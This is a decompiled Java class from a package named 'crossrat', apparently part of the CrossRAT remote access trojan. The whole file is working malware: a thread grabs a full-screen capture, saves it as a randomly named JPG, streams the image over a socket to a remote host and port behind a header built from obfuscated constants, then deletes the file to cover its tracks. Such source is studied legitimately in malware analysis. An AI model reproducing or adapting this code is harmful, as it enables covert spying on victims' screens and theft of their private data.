/*
 * Decompiled with CFR 0_124.
 */
package crossrat;

import crossrat.k;
import java.awt.AWTException;
import java.awt.Dimension;
import java.awt.HeadlessException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.awt.image.RenderedImage;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.util.Random;
import javax.imageio.ImageIO;

final class j
extends Thread {
    private Socket a;
    private String b;
    private int c;

    public j(String string, int n) {
        this.b = string;
        this.c = n;
    }

    private void a(String object, String arrby) {
        this.a = new Socket(this.b, this.c);
        DataOutputStream dataOutputStream = new DataOutputStream(this.a.getOutputStream());
        object = new FileInputStream((String)object);
        dataOutputStream.writeBytes(String.valueOf(k.g) + k.d + k.I + k.d + (String)arrby + k.d + "&&&");
        try {
            Thread.sleep(2000L);
        }
        catch (Exception exception) {
            arrby = exception;
            exception.printStackTrace();
        }
        arrby = new byte[2048];
        while (object.read(arrby) > 0) {
            dataOutputStream.write(arrby);
        }
        object.close();
        dataOutputStream.close();
    }

    @Override
    public final void run() {
        System.setProperty("java.awt.headless", "false");
        Object object = null;
        try {
            object = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
        }
        catch (HeadlessException headlessException) {
            HeadlessException headlessException2 = headlessException;
            headlessException.printStackTrace();
        }
        catch (AWTException aWTException) {
            AWTException n = aWTException;
            aWTException.printStackTrace();
        }
        Random random = new Random();
        int n = random.nextInt(500000) + 1;
        File file = new File(String.valueOf(k.K) + Integer.toString(n) + ".jpg");
        try {
            ImageIO.write((RenderedImage)object, "jpg", file);
            object = file.length();
            this.a(file.toString(), object.toString());
            file.delete();
            return;
        }
        catch (IOException iOException) {
            object = iOException;
            iOException.printStackTrace();
            return;
        }
    }
}
